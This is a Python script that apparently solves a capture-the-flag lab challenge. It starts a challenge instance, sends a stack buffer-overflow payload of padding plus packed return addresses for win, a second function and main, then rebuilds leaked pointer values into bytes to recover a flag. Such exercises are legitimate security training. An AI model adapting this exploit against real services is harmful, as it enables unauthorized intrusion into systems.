import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/306/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/306/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
WIN = 0x08049810
UC = 0x08049890
MAIN = 0x08049970
payload = b"A" * 14 + struct.pack("<I", WIN) + struct.pack("<I", UC) + struct.pack("<I", MAIN)
s = socket.create_connection((host, port), timeout=15)
s.settimeout(8)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(payload + b"\n")
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:900])
# reconstitution depuis les %p
leaks = re.findall(r"0x[0-9a-f]{6,12}", txt)
print("\nleaks:", leaks)
chunks = []
for h in leaks:
    v = int(h, 16)
    b4 = struct.pack("<I", v & 0xFFFFFFFF)
    chunks.append((h, b4))
for h, b4 in chunks:
    print("  %-12s -> %r" % (h, b4))
joined = b"".join(b for _, b in chunks)
print("\nconcat:", joined)
m = re.search(rb"(?:academy|picoCTF)\{[^}]*\}", joined)
print("FLAG:", m.group(0).decode() if m else None)
